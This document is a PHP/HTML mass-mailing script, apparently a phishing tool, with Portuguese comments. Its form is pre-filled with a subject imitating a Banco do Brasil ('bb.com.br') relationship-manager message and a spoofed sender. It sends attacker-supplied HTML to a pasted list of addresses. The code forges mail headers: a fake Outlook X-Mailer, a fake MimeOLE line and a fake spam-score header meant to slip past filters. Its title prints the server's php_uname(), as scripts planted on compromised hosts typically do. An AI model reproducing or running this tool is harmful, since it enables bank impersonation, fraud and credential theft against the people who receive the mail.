<head>
<title><?php echo $UNAME = @php_uname(); ?></title>
<style type="text/css">
<!--
body {
	background-color: #2f4f4f;
}
body, td, th {
	color: #ff0000;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 9px;
}
#form1 #emails {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 9px;
	color: #000080;
}
#form1 #Enviar {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 11px;
	color: #333333;
	background-color: #999999;
}
.uaA {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 9px;
}
#form1 #html {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 9px;
	color: #FF0000;
}
-->
</style>
</head>
<body style="background-color: #000000">
<label>
<div align="center">
<table width="455" border="4" height="224" bordercolorlight="#000000" bordercolordark="#000000" bgcolor="#000000">
  <tr align="center" >
    <td width="439" height="220" align="center" bgcolor="#000000"><form action="" method="post" name="form1" class="uaA" id="form1">

      <center>
		<table align="center" width="439" border="0">
        <tr align="center" >

          <td align="center" bgcolor="#000000">
          <input name="nome" type="text" class="uaA" id="nome" size="60" value="Sandro de paula " /><label><br>
          <input name="assunto" type="text" class="uaA" id="assunto" size="60" value="Re: Gerentes de Relacionamento - [bb.com.br] " /><br>
	 <textarea name="html" cols="60" rows="8" id="html"></textarea><br>
		<textarea name="emails" cols="60" rows="8" id="emails"></textarea></td>
          <td align="center" bgcolor="#000000" width="4">
          &nbsp;</td>
        </tr>
        <tr align="center" >

          <td height="16" align="center" bgcolor="#000000">
<label>
          &nbsp;&nbsp;
			<br>

          <input name="remetente" type="text" class="uaA" id="remetente" size="30" value="webmaster.brasil@outlook.com" />&nbsp;<input name="returpath" type="text" class="uaA" id="returpath" size="30" value="webmaster.brasil@outlook.com" /><br>
<br>

        <input name="Enviar" type="submit" id="Enviar"value="Envia" style="float: left; font-weight:700" /></td>
          <td height="16" align="center" bgcolor="#000000" width="4"></td>
        </tr>
      </table>
      	</form></td>
  </tr>
</table>

</div>

<?
//@ignore_user_abort(TRUE);
//error_reporting(0);
//@set_time_limit(0);
//ini_set("memory_limit","-1");
// Pega os valores dos forms para as vari&aacute;veis.
$enviar = $_POST['Enviar'];       // Pega o valor do bot&atilde;o Enviar caso ele seja pressionado.
$remetente = $_POST['remetente']; // Pega o email do remetente.
$nome = $_POST['nome'];           // Pega o nome do remetente.
$assunto = $_POST['assunto'];     // Pega o assunto.
$e_retorno = $_POST['returpath']; // Pega o email para retornar os erros (Return-Path)
$lista_emails = $_POST['emails']; // Pega a lsita de emails.
$lista_html = $_POST['html'];     // Pega os codigos html.
$emails_lista = explode("\n", $lista_emails); // Pegas os emails separados por quebra de linha "\n".
$numemails = count($emails_lista); // Pega a quantidade de emails da lista.
$mensagem = $lista_html;
$mensagem = stripslashes($mensagem);
?>


<table align="center" width="847" border="0" align="center">
  <tr>
    <td width="841" align="center">

	<?php
	if ($enviar){
	echo ("Msg Enviada");
	}
	?>	</td>
  </tr>
</table>
<table align="center" width="294" border="0" align="center" cellspacing="0">
  <tr>
    <td width="292">
<?
if ($enviar){

$headers .= "MIME-Version: 1.0 \n";
$headers .= "Content-type: text/html; charset=utf-8 \n";
$headers .= "X-Mailer: Microsoft Office Outlook, Build 17.551210 \n";
$headers .= "Message-ID: <".md5(uniqid(time()))."@$MailServer> \n";
$headers .= "X-Priority: 1.0 \n";
$headers .= "Content-Transfer-encoding: 8bit \n";
$headers .= "From: Sandro de paula <webmaster.brasil@outlook.com> \n";
$headers .= "Return-Path: <webmaster.brasil@outlook.com> \n";
$headers .= "Reply-To: Sandro de paula <webmaster.brasil@outlook.com> \n";
$headers .= "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441 \n";
$headers .= "X-iGspam-global: Unsure, spamicity=0.570081 - pe=5.74e-01 - pf=0.574081 - pg=0.574081 \n";
$data = date("d/m/Y");
$boundary = rand(1,99009988);
$emails = str_replace("%EMAIL%", $to, $emails);


	
echo ('Nome do Remetente: ' . $nome . '<br>');
echo ('E-mail do Remetente: ' . $remetente . '<br>');
echo ('Assunto: ' . $assunto . '<br>');
echo ('E-mail de retorno: ' . $e_retorno . '<br>');
echo ('Quantidade de email: ' . $numemails . '<br>');

?>

</td>
  </tr>
  <tr>
    <td>
<?
// Sistema para enviar os emails
for($x=0; $x<$numemails; $x++){
$quanti++;
$email_go = $emails_lista[$x];
$mail = mail($email_go, $assunto.$data, $mensagem.$boundary.$destino, $headers);
if ($mail==1) {
$okenviado++;
echo('<font color="#00ff00">Enviando: ' . $quanti . '&nbsp;<b>' . $email_go .  '</b></font>' . '<font color=blue face=verdana size=1> ok.</font><br>');
} else {
$erroenviado++;
echo('<font color="#00ff00">N&atilde;o enviado: ' . $quanti . '&nbsp;<b>' . $email_go .  '</b></font>' . '<font color=red face=verdana size=1> erro </font><br>');
sleep(1);}
}
echo('<font color="#0033FF" size="1" face="Verdana, Arial, Helvetica, sans-serif"></font><br>');
echo ('Total de E-mals enviados com sucesso: ' . $okenviado . '<br>');
echo ('Total de E-mails n&atilde;o enviados: ' . $erroenviado . '<br>');
}
?>